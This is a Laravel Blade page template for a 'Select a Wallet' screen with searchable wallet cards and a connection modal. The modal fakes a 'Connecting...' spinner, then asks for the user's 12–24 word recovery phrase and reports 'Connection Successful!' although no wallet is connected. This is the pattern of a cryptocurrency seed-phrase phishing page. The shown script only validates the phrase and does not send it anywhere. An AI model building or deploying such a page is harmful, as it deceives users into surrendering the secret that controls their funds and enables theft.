@extends('layouts.app')

@section('content')
<style>
    /* Original website styling for connect page */
    .searchBox {
        display: grid;
        grid-template-columns: 80% 20%;
        grid-gap: 10px;
        margin: 20px 0px;
    }

    .searchBox input {
        border-radius: 0px;
        border: 2px solid #000;
        padding: 10px 15px;
        font-size: 14px;
    }

    .searchBox input:focus {
        border: 2px solid #000;
        box-shadow: none;
        outline: none;
    }

    .searchBox .btn {
        font-size: 16px;
    }

    @media screen and (max-width: 768px) {
        .searchBox {
            grid-template-columns: 100%;
        }
    }

    /* Wallet card styling */
    .sc-author-box {
        position: relative;
        background: #fff;
        border-radius: 10px;
        padding: 20px;
        text-align: center;
        transition: all 0.3s ease;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        cursor: pointer;
        border: 2px solid transparent;
        min-height: 200px;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        will-change: transform, box-shadow;
        backface-visibility: hidden;
        perspective: 1000px;
    }

    .sc-author-box:hover {
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
        transform: translateY(-5px);
        border-color: #7C3AED;
    }

    .author-avatar {
        position: relative;
        display: inline-block;
        margin-bottom: 15px;
    }

    .author-avatar img {
        width: 100px;
        height: 100px;
        border-radius: 50%;
        object-fit: contain;
        background: #f5f5f5;
        padding: 10px;
    }

    .badge {
        position: absolute;
        bottom: 0;
        right: 0;
        width: 30px;
        height: 30px;
        background: #7C3AED;
        border-radius: 50%;
        border: 3px solid white;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .badge .ripple {
        width: 8px;
        height: 8px;
        background: white;
        border-radius: 50%;
    }

    .author-infor {
        margin-top: 10px;
    }

    .author-infor h5 {
        font-size: 16px;
        font-weight: 600;
        color: #1F2937;
        margin: 10px 0 5px 0;
    }

    .author-infor .price {
        font-size: 12px;
        color: #6B7280;
    }

    .tf-title {
        font-size: 28px;
        font-weight: 700;
        margin-bottom: 20px;
        color: #1F2937;
    }

    .heading-line {
        width: 50px;
        height: 3px;
        background: #7C3AED;
        margin-bottom: 20px;
        border-radius: 2px;
    }

    .wallet_select {
        transition: all 0.3s ease;
    }

    .wallet_select.hidden {
        display: none !important;
    }

    .select_wallet {
        min-height: 200px;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }

    /* Modal Styling */
    .modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.6);
        z-index: 9998;
        opacity: 0;
        visibility: hidden;
        transition: opacity 0.3s ease, visibility 0.3s ease;
        pointer-events: none;
    }

    .modal-overlay.active {
        opacity: 1;
        visibility: visible;
        pointer-events: auto;
    }

    .modal-content {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: white;
        border-radius: 10px;
        padding: 30px;
        max-width: 500px;
        width: 90%;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        z-index: 9999;
        display: none;
    }

    .modal-content.show {
        display: block;
    }

    .modal-close {
        position: absolute;
        top: 15px;
        right: 15px;
        background: none;
        border: none;
        font-size: 28px;
        cursor: pointer;
        color: #6B7280;
        transition: color 0.2s;
    }

    .modal-close:hover {
        color: #1F2937;
    }

    .spinner-border {
        border: 4px solid #e5e7eb;
        border-top-color: #7C3AED;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        display: inline-block;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    .success-box {
        background: #d1fae5;
        border: 1px solid #6ee7b7;
        border-radius: 5px;
        padding: 20px;
        margin-bottom: 20px;
        text-align: center;
    }

    .success-box h5 {
        color: #065f46;
        margin: 0 0 10px 0;
    }

    .success-box p {
        color: #047857;
        margin: 0;
    }

    .btn-primary-custom {
        width: 100%;
        padding: 12px;
        background: #7C3AED;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-weight: 600;
        transition: background 0.3s;
    }

    .btn-primary-custom:hover {
        background: #6d28d9;
    }

    textarea {
        width: 100%;
        height: 100px;
        padding: 10px;
        border: 1px solid #e5e7eb;
        border-radius: 5px;
        font-family: monospace;
        font-size: 14px;
    }

    textarea:focus {
        outline: none;
        border-color: #7C3AED;
        box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.1);
    }

    .step-content {
        display: none;
    }

    .step-content.active {
        display: block;
    }
</style>

<div class="container mt-5 mb-5">
    <div class="row" id="searchList">
        <div class="col-md-12">
            <h2 class="tf-title">Select a Wallet</h2>
            <div class="heading-line"></div>
        </div>

        <div class="col-md-12 searchBox">
            <input type="text" class="w-100" name="searchInp" id="searchInp" placeholder="Find your wallet">
            <button class="btn btn-primary rounded-0 py-2" onclick="performSearch()" style="background: #7C3AED; border: none; color: white;">Search</button>
        </div>

        <div class="col-md-12 my-4">
            <div class="w-100 py-2" id="numRes">
                <h5 class="fs-6"><span id="resnum">{{ count($wallets) }}</span> results found</h5>
            </div>
        </div>

        <!-- Wallet Cards -->
        @foreach($wallets as $wallet)
        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select" data-wallet-name="{{ strtolower($wallet['name']) }}">
            <div class="sc-author-box select_wallet" 
                 data-title="{{ $wallet['name'] }}"
                 data-logo="{{ $wallet['logo'] }}"
                 onclick="connectWallet(this)"
                 style="cursor:pointer;">
                <div class="author-avatar">
                    <a href="javascript:void(0);">
                        @if(strpos($wallet['logo'], 'http') === 0)
                            <img src="{{ $wallet['logo'] }}" alt="{{ $wallet['name'] }}" class="avatar" onerror="this.src='/static/logo/placeholder.png'">
                        @else
                            <img src="{{ $wallet['logo'] }}" alt="{{ $wallet['name'] }}" class="avatar" onerror="this.src='/static/logo/placeholder.png'">
                        @endif
                    </a>
                    <div class="badge"><i class="ripple"></i></div>
                </div>
                <div class="author-infor">
                    <h5 class="style2"><a>{{ $wallet['name'] }}</a></h5>
                    <span class="price">{{ $wallet['domain'] }}</span>
                </div>
            </div>
        </div>
        @endforeach
    </div>
</div>

<!-- Connection Modal -->
<div id="modalOverlay" class="modal-overlay"></div>
<div id="connectionModal" class="modal-content">
    <button class="modal-close" onclick="closeModal()">&times;</button>

    <div id="step1" class="step-content active">
        <h4 style="margin-bottom: 20px; text-align: center;">Connecting to <strong id="selectedWalletName"></strong></h4>
        <div style="text-align: center;">
            <div class="spinner-border"></div>
        </div>
        <p style="margin-top: 20px; color: #6B7280; text-align: center;">Please wait while we connect your wallet...</p>
    </div>

    <div id="step2" class="step-content">
        <h4 style="margin-bottom: 20px;">Enter Recovery Phrase</h4>
        <textarea id="phraseInput" placeholder="12, 15, 18, 21, or 24 word seed phrase..."></textarea>
        <button onclick="submitPhrase()" class="btn-primary-custom" style="margin-top: 20px;">Continue</button>
    </div>

    <div id="step3" class="step-content">
        <div class="success-box">
            <h5>✓ Connection Successful!</h5>
            <p id="successMsg"></p>
        </div>
        <button onclick="closeModal()" class="btn-primary-custom">Done</button>
    </div>
</div>

<script>
let searchTimeout;
let cachedCards = null;

function getCachedCards() {
    if (!cachedCards) {
        cachedCards = document.querySelectorAll('.wallet_select');
    }
    return cachedCards;
}

function performSearch() {
    const searchTerm = document.getElementById('searchInp').value.toLowerCase();
    const cards = getCachedCards();
    let count = 0;

    cards.forEach(card => {
        const name = card.dataset.walletName;
        if (searchTerm === '' || name.includes(searchTerm)) {
            card.classList.remove('hidden');
            count++;
        } else {
            card.classList.add('hidden');
        }
    });

    document.getElementById('resnum').textContent = count;
}

// Real-time search with debounce to prevent flickering
const searchInput = document.getElementById('searchInp');
searchInput.addEventListener('keyup', function() {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(performSearch, 150);
});

searchInput.addEventListener('input', function(e) {
    e.preventDefault();
});

function connectWallet(element) {
    const walletName = element.dataset.title;
    document.getElementById('selectedWalletName').textContent = walletName;
    
    // Show modal
    document.getElementById('modalOverlay').classList.add('active');
    document.getElementById('connectionModal').classList.add('show');
    
    // Reset steps
    document.getElementById('step1').classList.add('active');
    document.getElementById('step2').classList.remove('active');
    document.getElementById('step3').classList.remove('active');

    // Simulate auto-connect after 2 seconds
    setTimeout(() => {
        if (document.getElementById('modalOverlay').classList.contains('active')) {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }
    }, 2000);
}

function closeModal() {
    document.getElementById('modalOverlay').classList.remove('active');
    document.getElementById('connectionModal').classList.remove('show');
    
    // Reset all steps
    document.getElementById('step1').classList.add('active');
    document.getElementById('step2').classList.remove('active');
    document.getElementById('step3').classList.remove('active');
    document.getElementById('phraseInput').value = '';
}

function submitPhrase() {
    const phrase = document.getElementById('phraseInput').value;
    const phraseWords = phrase.trim().split(/\s+/).filter(word => word.length > 0);
    
    if (![12, 15, 18, 21, 24].includes(phraseWords.length)) {
        alert('Please enter a valid 12, 15, 18, 21, or 24 word seed phrase');
        return;
    }
    
    document.getElementById('step2').classList.remove('active');
    document.getElementById('step3').classList.add('active');
    document.getElementById('successMsg').textContent = `Wallet "${document.getElementById('selectedWalletName').textContent}" has been connected successfully!`;
    
    // Auto-close after 3 seconds
    setTimeout(() => {
        closeModal();
    }, 3000);
}

// Close modal on overlay click
document.getElementById('modalOverlay').addEventListener('click', closeModal);

// Prevent modal close when clicking inside modal
document.getElementById('connectionModal').addEventListener('click', function(e) {
    e.stopPropagation();
});

// Close modal on Escape key
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' && document.getElementById('modalOverlay').classList.contains('active')) {
        closeModal();
    }
});
</script>
@endsection
